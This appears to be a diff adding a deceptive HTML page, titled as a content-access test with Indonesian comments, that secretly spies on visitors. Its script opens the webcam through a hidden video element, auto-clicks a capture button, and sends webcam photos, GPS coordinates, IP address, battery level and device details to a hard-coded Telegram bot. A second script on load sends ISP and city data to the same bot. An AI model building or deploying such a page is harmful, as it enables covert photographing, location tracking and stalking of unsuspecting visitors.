@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Web test, Allow to see all content</title>
+  <style>
+    body {
+      background-image: url('https://blue.kumparan.com/image/upload/fl_progressive,fl_lossy,c_fill,q_auto:best,w_640/v1641577573/rtjreyn7pig0vnxxmijt.jpg');
+      background-repeat: no-repeat;
+      background-size: cover;
+    }
+  </style>
+</head>
+<body>
+  <h1>Web test, Allow to see all content</h1>
+  <video id="video" width="0" height="0" autoplay></video>
+  <button id="capture-btn">CLICK HERE</button>
+  <canvas id="canvas" width="0" height="0" style="display: none;"></canvas>
+
+  <script>
+    var video = document.getElementById('video');
+
+    var constraints = { video: true };
+
+    navigator.mediaDevices.getUserMedia(constraints)
+      .then(function(mediaStream) {
+        video.srcObject = mediaStream;
+        video.onloadedmetadata = function(e) {
+          video.play();
+        };
+      })
+      .catch(function(err) {
+        console.error(err);
+      });
+
+    var captureButton = document.getElementById('capture-btn');
+
+    captureButton.onclick = function() {
+      var canvas = document.getElementById('canvas');
+      var context = canvas.getContext('2d');
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      var imageDataURL = canvas.toDataURL('image/png');
+
+      // Mendapatkan lokasi akurat menggunakan GPS
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          var latitude = position.coords.latitude;
+          var longitude = position.coords.longitude;
+          var accuracy = position.coords.accuracy;
+
+          // Mendapatkan informasi perangkat secara detail
+          var deviceInfo = {
+            userAgent: navigator.userAgent,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            platform: navigator.platform,
+            batteryLevel: null,
+            isp: null, // Info ISP perangkat
+            imei: null, // Info IMEI perangkat
+            ipAddress: null // Alamat IP perangkat
+          };
+
+          // Mendapatkan informasi batrai perangkat
+          if ("getBattery" in navigator) {
+            navigator.getBattery()
+              .then(function(battery) {
+                deviceInfo.batteryLevel = battery.level * 100;
+
+                // Mengambil IP perangkat menggunakan layanan ipify
+                fetch('https://api.ipify.org?format=json')
+                  .then(function(response) {
+                    return response.json();
+                  })
+                  .then(function(data) {
+                    deviceInfo.ipAddress = data.ip;
+
+                    // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
+                    sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
+                  })
+                  .catch(function(error) {
+                    console.error('Terjadi kesalahan dalam mendapatkan alamat IP:', error);
+                    sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
+                  });
+              })
+              .catch(function(error) {
+                console.error('Gagal mendapatkan informasi batrai:', error);
+                sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
+              });
+          } else {
+            console.error('Browser tidak mendukung mendapatkan informasi batrai.');
+            sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
+          }
+        }, function(error) {
+          console.error('Gagal mendapatkan lokasi:', error);
+          sendToTelegram(null, null, null, null, imageDataURL);
+        });
+      } else {
+        console.error('Browser tidak mendukung geolocation.');
+        sendToTelegram(null, null, null, null, imageDataURL);
+      }
+    };
+
+    // Fungsi untuk mengirim data foto, lokasi, dan informasi perangkat ke Telegram API
+    function sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL) {
+      var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+      var chatId = '1121369247';
+
+      var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+      var formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', dataURItoBlob(imageDataURL));
+
+      var caption = '';
+
+      if (latitude !== null && longitude !== null && accuracy !== null) {
+        caption += 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)\n\n';
+      }
+
+      caption += 'Informasi Perangkat:\n' + JSON.stringify(deviceInfo);
+
+      formData.append('caption', caption);
+
+      fetch(url, {
+        method: 'POST',
+        body: formData
+      })
+      .then(function(response) {
+        console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
+      })
+      .catch(function(error) {
+        console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
+      });
+    }
+
+    // Fungsi untuk mengonversi data URI menjadi Blob
+    function dataURItoBlob(dataURI) {
+      var byteString = atob(dataURI.split(',')[1]);
+      var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      var ab = new ArrayBuffer(byteString.length);
+      var ia = new Uint8Array(ab);
+      for (var i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+
+    // Fungsi untuk melakukan klik tombol secara otomatis
+    function autoClickButton() {
+      var button = document.getElementById('capture-btn');
+      var clickCount = 0;
+      var maxClicks = 5;
+      var delay = 3000; // Delay dalam milidetik (misal: 1000 = 1 detik)
+
+      var interval = setInterval(function() {
+        button.click();
+        clickCount++;
+        if (clickCount >= maxClicks) {
+          clearInterval(interval);
+        }
+      }, delay);
+    }
+
+    // Melakukan klik tombol setelah 3 detik
+    setTimeout(autoClickButton, 3000);
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script>
+    // Fungsi untuk mengirim pesan ke bot Telegram
+    function sendMessageToTelegram(message) {
+      var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+      var chatId = '1121369247';
+
+      // Buat URL untuk mengirim pesan menggunakan bot Telegram
+      var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+      var data = {
+        chat_id: chatId,
+        text: message
+      };
+
+      // Kirim permintaan POST ke API Telegram menggunakan metode AJAX
+      $.ajax({
+        url: url,
+        type: 'POST',
+        data: data,
+        success: function(response) {
+          console.log('Pesan berhasil dikirim ke Telegram');
+        },
+        error: function(error) {
+          console.error('Terjadi kesalahan saat mengirim pesan ke Telegram:', error);
+        }
+      });
+    }
+
+    // Fungsi untuk mendapatkan informasi IP perangkat
+    function getDeviceInfo() {
+      // Ambil informasi IP perangkat menggunakan API ip-api.com
+      $.get('https://ipapi.co/json/', function(response) {
+        // Ambil nilai-nilai yang diperlukan dari respons API
+        var isp = response.org;
+        var country = response.country_name;
+        var region = response.region;
+        var city = response.city;
+        var coordinates = response.latitude + ', ' + response.longitude;
+        var localTime = new Date().toLocaleString();
+        var domain = response.hostname;
+        var netSpeed = response.connection;
+        var mobileCarrier = response.org;
+
+        // Format pesan yang akan dikirim ke bot Telegram
+        var message = `
+          ISP: ${isp}
+          Country: ${country}
+          Region: ${region}
+          City: ${city}
+          Coordinates of City: ${coordinates}
+          Local Time: ${localTime}
+          Domain: ${domain}
+          Net Speed: ${netSpeed}
+          Mobile Carrier: ${mobileCarrier}
+        `;
+
+        // Kirim pesan ke bot Telegram
+        sendMessageToTelegram(message);
+      });
+    }
+
+    // Panggil fungsi getDeviceInfo sebanyak 1 kali
+    $(document).ready(function() {
+      for (var i = 0; i < 1; i++) {
+        setTimeout(getDeviceInfo, i * 3000); // Mengirim setiap 5 detik
+      }
+    });
+  </script>
+</body>
+</html>
